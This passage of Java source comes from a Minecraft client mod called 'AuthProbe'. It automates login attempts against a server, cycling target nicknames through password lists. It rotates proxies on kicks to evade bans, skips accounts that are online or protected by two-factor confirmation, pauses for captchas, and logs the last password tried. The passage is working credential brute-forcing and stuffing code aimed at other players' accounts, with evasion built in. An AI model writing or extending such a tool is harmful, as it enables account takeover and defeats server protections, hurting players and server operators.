            if (!target.passwords().isEmpty() && Nicks.isValid(target.nick())) {
                next = i;
                break;
            }
        }
        if (next < 0) return false;

        config.activeIndex(next);
        passwordIndex = 0;
        nickSentCount = 0;
        lastPassword = "";
        sendSpent = false;
        pauseRetries = 0;
        nickSent = false;
        captchaPaused = false;
        droppedTwoFactorShown = false;
        begun = true;
        autoResume = false;
        waitForStart = switchWaitForStart;
        switchWaitForStart = true;
        reconnectPending = false;
        ChatWatcher.disarm();
        SessionSwap.toOffline(config.nick());
        announceNickChange();

        // The nickname is part of the login handshake, so the old session has to go.
        Minecraft minecraft = Minecraft.getInstance();
        ClientPacketListener old = minecraft.getConnection();
        AuthProbe.logger().info("AuthProbe: switching to nick #{} '{}' ({} passwords), old connection={}.",
                config.activeIndex() + 1, config.nick(), config.passwordCount(), old != null);
        long switchStarted = System.currentTimeMillis();
        state = State.CONNECTING;
        if (old != null) {
            minecraft.clearLevel();
            // clearLevel only drops the level, the socket has to be closed explicitly.
            old.getConnection().disconnect(Component.literal("AuthProbe: switching nickname"));
        }
        if (!ServerConnector.connect(minecraft.screen, config.address())) {
            state = State.DISCONNECTED;
            reconnectPending = true;
            reconnectAt = System.currentTimeMillis();
        }
        AuthProbe.logger().info("AuthProbe: nick switch connect request done in {} ms.",
                System.currentTimeMillis() - switchStarted);
        return true;
    }

    /**
     * Checks whether a kick reason is about the nickname rather than the password.
     *
     * @param reason Kick or connect failure reason
     * @return Whether the nickname itself was rejected
     */
    private static boolean isNickKick(String reason) {
        if (reason == null || reason.isBlank()) return false;
        return PatternBank.matches(nickOnline(), reason) || PatternBank.matches(nickInvalid(), reason);
    }

    /**
     * Checks whether a nickname kick is permanent. The server rejected the name itself, so the
     * mark says so instead of inviting a retry hours later.
     *
     * @param reason Kick reason
     * @return Whether the nickname itself is invalid
     */
    private static boolean isPermanentNickKick(String reason) {
        return reason != null && PatternBank.matches(nickInvalid(), reason);
    }

    /**
     * Classifies the last disconnect for the kick screen and the log.
     *
     * @param reason Kick or connect-failure reason
     */
    private static void classifyKick(String reason) {
        kickClass = "";
        if (reason == null || reason.isBlank()) return;

        String invalidRule = PatternBank.matchesAny(nickInvalid(), reason);
        if (!invalidRule.isEmpty()) {
            kickClass = "nick-invalid";
            AuthProbe.logger().info("AuthProbe: kick classified as nick-invalid by '{}'.", invalidRule);
            return;
        }
        String onlineRule = PatternBank.matchesAny(nickOnline(), reason);
        if (!onlineRule.isEmpty()) {
            kickClass = "nick-online";
            AuthProbe.logger().info("AuthProbe: kick classified as nick-online by '{}'.", onlineRule);
            return;
        }
        String proxyRule = PatternBank.matchesAny(proxyKicks(), reason);
        if (!proxyRule.isEmpty()) {
            kickClass = "proxy";
            AuthProbe.logger().info("AuthProbe: kick classified as proxy by '{}'.", proxyRule);
            return;
        }
        AuthProbe.logger().info("AuthProbe: kick reason not recognized: {}", reason);
    }

    /**
     * Gets the classification of the last disconnect as a translation key.
     *
     * @return Translation key
     */
    public static String kickClassKey() {
        return "authprobe.kickclass." + (kickClass.isEmpty() ? "none" : kickClass);
    }

    /**
     * Gets the amount of server pauses waited out in this run.
     *
     * @return Pause count
     */
    public static int pauseCount() {
        return pauseCount;
    }

    /**
     * Checks whether auto-reconnect should rotate the proxy for this kick.
     *
     * @param reason Kick reason
     * @return Whether to rotate the proxy
     */
    private static boolean shouldRotateProxy(String reason) {
        ProbeConfig config = ProbeConfig.INSTANCE;
        return !proxyRotationBlocked
                && config.autoReconnect()
                && config.proxyEnabled()
                && !config.proxies().isEmpty()
                && reason != null
                && !reason.isBlank()
                && PatternBank.matches(proxyKicks(), reason);
    }

    /**
     * Rotates to the next proxy before an automatic reconnect, never wrapping to the first.
     *
     * @return Whether a next proxy was available
     */
    private static boolean rotateProxyForKick() {
        ProbeConfig config = ProbeConfig.INSTANCE;
        if (!config.rotateProxyNoWrap()) {
            proxyRotationBlocked = true;
            reconnectPending = false;
            switchPending = false;
            state = State.DISCONNECTED;
            ChatWatcher.disarm();
            Component stopped = Component.literal("прокси закончились (№")
                    .append(Component.literal(String.valueOf(config.proxyIndex() + 1)).withStyle(ChatFormatting.AQUA))
                    .append(Component.literal("/" + config.proxies().size()
                            + "). Авто-реконнект остановлен. Нажми «Сменить прокси» для нового круга."));
            announce(stopped, ChatWatcher.COLOR_ERROR);
            notify(stopped);
            ProbeConfig.INSTANCE.saveIfDirty();
            return false;
        }

        proxyRotationBlocked = false;
        ProxyTunnel.closeAll();
        announceProxyChange();
        return true;
    }

    /**
     * Announces the active proxy in local chat and a toast.
     */
    public static void announceProxyChange() {
        ProbeConfig config = ProbeConfig.INSTANCE;
        ProxyEntry entry = ProxyEntry.parse(config.currentProxyLine());
        String display = entry == null ? "?" : entry.display();
        Component message = Component.literal("Прокси: №" + (config.proxyIndex() + 1)
                        + "/" + config.proxies().size())
                .withStyle(ChatFormatting.AQUA)
                .append(Component.literal(" " + display).withStyle(ChatFormatting.YELLOW));
        announce(message, ChatWatcher.COLOR_PROXY);
        notify(message);
    }

    /**
     * Announces the nickname the probe just switched to, in local chat and a toast.
     */
    private static void announceNickChange() {
        ProbeConfig config = ProbeConfig.INSTANCE;
        Component message = Component.literal("Ник: №" + (config.activeIndex() + 1)
                        + "/" + config.targets().size())
                .withStyle(ChatFormatting.AQUA)
                .append(Component.literal(" " + config.nick()).withStyle(ChatFormatting.YELLOW));
        announce(message, ChatWatcher.COLOR_NICK);
        notify(message);
        skipNextNickHeader = true;
    }

    /**
     * Abandons the current nickname and queues the next one. Used for invalid names,
     * "already online" kicks and two-factor accounts: spending the rest of this nick's
     * passwords would be pointless.
     *
     * @param reason Kick reason
     */
    private static void abandonNick(String reason) {
        abandonNick(reason, isPermanentNickKick(reason)
                ? ProbeTarget.KIND_INVALID : ProbeTarget.KIND_ONLINE, "");
    }

    /**
     * Abandons the current nickname with an explicit mark kind.
     *
     * @param reason Kick reason
     * @param kind   {@link ProbeTarget#KIND_ONLINE}, {@link ProbeTarget#KIND_INVALID}
     *               or {@link ProbeTarget#KIND_2FA}
     * @param rule   Phrase that triggered the mark, empty when not applicable
     */
    private static void abandonNick(String reason, String kind, String rule) {
        ProbeConfig config = ProbeConfig.INSTANCE;
        skippedTarget = config.activeIndex();
        skippedReason = reason == null ? "" : reason;
        ChatWatcher.disarm();
        reconnectPending = false;
        autoResume = false;
        sendSpent = false;
        pauseRetries = 0;

        // With auto-start on, a nickname switch continues by itself: the operator asked the probe
        // to keep going. With auto-start off it waits for .start, like any manual switch.
        switchWaitForStart = !config.autoStart();

        // Persist the mark: the nickname keeps its password list and waits for a manual retry.
        config.markSkip(skippedTarget, skippedReason, System.currentTimeMillis(), kind);
        config.save();

        MutableComponent line = Component.literal("nick ")
                .append(Component.literal("#" + (skippedTarget + 1) + "/" + config.targets().size())
                        .withStyle(ChatFormatting.AQUA))
                .append(Component.literal(" ("))
                .append(Component.literal(config.nick()).withStyle(ChatFormatting.YELLOW))
                .append(Component.literal(") "));
        if (ProbeTarget.KIND_2FA.equals(kind)) {
            line = line.append(Component.literal("2FA").withStyle(ChatFormatting.RED));
            if (rule != null && !rule.isBlank()) {
                line = line.append(Component.literal(" · «" + rule + "»").withStyle(ChatFormatting.DARK_GRAY));
            }
        } else {
            String text = skippedReason.isEmpty() ? "nickname rejected" : skippedReason;
            line = line.append(Component.literal("skipped: "))
                    .append(Component.literal(text).withStyle(ChatFormatting.RED));
        }
        announce(line, ChatWatcher.COLOR_ERROR);

        if (hasUsableNextTarget()) {
            if (!config.autoSwap()) {
                stopForManualSwitch("авто-смена выключена");
                return;
            }
            switchPending = true;
            switchAt = System.currentTimeMillis();
            state = State.DISCONNECTED;
            return;
        }

        state = State.EXHAUSTED;
        begun = false;
        String message = "done. all nicknames failed (last: " + config.nick() + ")";
        announce(message);
        notify(message);
        config.save();
    }

    /**
     * Marks the current nickname as a two-factor account and moves on. The password may well
     * have been correct: the server asks for a confirmation that only the operator can give.
     *
     * @param rule Phrase that triggered the detection
     */
    private static void handleTwoFactor(String rule) {
        ProbeConfig config = ProbeConfig.INSTANCE;
        AuthProbe.logger().warn("AuthProbe: 2FA for nick #{} '{}' by '{}', last password: {}",
                config.activeIndex() + 1, config.nick(), rule, lastPassword);
        abandonNick("2FA", ProbeTarget.KIND_2FA, rule);
    }

    /**
     * Marks the current nickname as a two-factor account on operator request and moves on.
     */
    public static void markTwoFactor() {
        if (!armed()) {
            announce("2fa: прогон не идёт");
            return;
        }
        handleTwoFactor("вручную");
    }

    /**
     * Stops sending until the operator passes the captcha and types {@code .start}.
     *
     * @param rule Phrase that triggered the pause
     */
    private static void pauseForCaptcha(String rule) {
        if (captchaPaused) {
            state = State.ARMED;
            return;
        }
        captchaPaused = true;
        state = State.ARMED;
        ChatWatcher.disarm();
        MutableComponent line = Component.literal("капча — пройди проверку и нажми .start / .go");
        if (rule != null && !rule.isBlank()) {
            line = line.append(Component.literal(" · «" + rule + "»").withStyle(ChatFormatting.DARK_GRAY));
        }
        warn(line);
    }

    /**
     * Gets the target index the current run started from.
     *
     * @return Start target index
     */
    public static int runStartTarget() {
        return runStartTarget;
    }

    /**
     * Gets the target index abandoned because the nickname was rejected, or {@code -1}.
     *
     * @return Skipped target index
     */
    public static int skippedTarget() {
        return skippedTarget;
    }

    /**
     * Gets the reason the nickname was abandoned, empty when none.
     *
     * @return Skip reason
     */
    public static String skippedReason() {
        return skippedReason;
    }

    /**
     * Describes the next step: current nick/password, next nick's first password, or nothing.
     *
     * @return Localized next-step component
     */
    public static Component describeNextComponent() {
        ProbeConfig config = ProbeConfig.INSTANCE;
        if (state == State.SUCCESS || state == State.EXHAUSTED) {
            return Component.translatable("authprobe.next.done");
        }
        boolean currentSkipped = skippedTarget == config.activeIndex();
        if (!currentSkipped && passwordIndex < config.passwordCount() && !config.passwords().isEmpty()) {
            return Component.translatable("authprobe.next.step", config.nick(), config.passwords().get(passwordIndex));
        }
        for (int i = config.activeIndex() + 1; i < config.targets().size(); i++) {
            ProbeTarget target = config.targets().get(i);
            if (!target.passwords().isEmpty() && Nicks.isValid(target.nick())) {
                return Component.translatable("authprobe.next.step", target.nick(), target.passwords().get(0));
            }
        }
        return Component.translatable("authprobe.next.done");
    }

    /**
     * Announces the last password used.
     *
     * @param reason Reason label
     */
    private static void announceLastUsed(String reason) {
        String password = lastPassword.isEmpty() ? "(none)" : lastPassword;
        announce(reason + ". last used password: " + password
                + " (password #" + (passwordIndex + 1) + " of " + ProbeConfig.INSTANCE.passwordCount() + ")");
    }

    /**
     * Resets the run counters.
     */
    private static void reset() {
        passwordIndex = 0;
        sentCount = 0;
        nickSentCount = 0;
        lastPassword = "";
        kickReason = "";
        pauseRetries = 0;
        pauseCount = 0;
        kickClass = "";
        nickSent = false;
        captchaPaused = false;
        switchWaitForStart = true;
        droppedTwoFactorShown = false;
        skipNextNickHeader = false;
        attemptStartedAt = 0L;
        holdAnnounced = false;
        holdSeen = false;
        packetSuccess = false;
        reconnectPending = false;
        reconnectCount = 0;
        autoResume = false;
        sendSpent = false;
        begun = false;
        switchPending = false;
        runStartTarget = ProbeConfig.INSTANCE.activeIndex();
        skippedTarget = -1;
        skippedReason = "";
        waitForStart = false;
        switchAt = 0L;
        proxyRotationBlocked = false;
    }

    /**
     * Sends a status line to the in-game chat and the log.
     *
     * @param message Message
     */
    public static void announce(String message) {
        announce(Component.literal(message), ChatWatcher.COLOR_INFO);
    }

    /**
     * Sends a styled status line to the in-game chat and the log.
     *
     * @param message Message
     */
    public static void announce(Component message) {
        announce(message, ChatWatcher.COLOR_INFO);
    }

    /**
     * Sends a styled status line with an explicit pane colour.
     *
     * @param message Message
     * @param color   Colour used for the local copy in the chat pane
     */
    public static void announce(Component message, int color) {
        AuthProbe.logger().info("AuthProbe: {}", message.getString());
        mirrorLocal(PREFIX + message.getString(), color);
        Minecraft minecraft = Minecraft.getInstance();
        if (minecraft == null || minecraft.player == null) return;
        minecraft.player.displayClientMessage(Component.literal(PREFIX).append(message), false);
    }

    /**
     * Mirrors a local line into the chat pane while debug logs are on, so the pane shows the
     * same trail the in-game chat does.
     *
     * @param text  Full line, prefix included
     * @param color Line colour in the pane
     */
    private static void mirrorLocal(String text, int color) {
        if (!ProbeConfig.INSTANCE.debugLogs()) return;
        ChatWatcher.local(text, color);
    }

    /**
     * Shows a toast.
     *
     * @param message Message
     */
    private static void notify(String message) {
        notify(Component.literal(message));
    }

    /**
     * Shows a styled toast.
     *
     * @param message Message
     */
    public static void notify(Component message) {
        Minecraft minecraft = Minecraft.getInstance();
        if (minecraft == null) return;
        SystemToast.add(minecraft.getToasts(), SystemToast.SystemToastIds.PERIODIC_NOTIFICATION,
                Component.literal("AuthProbe"), message);
    }
}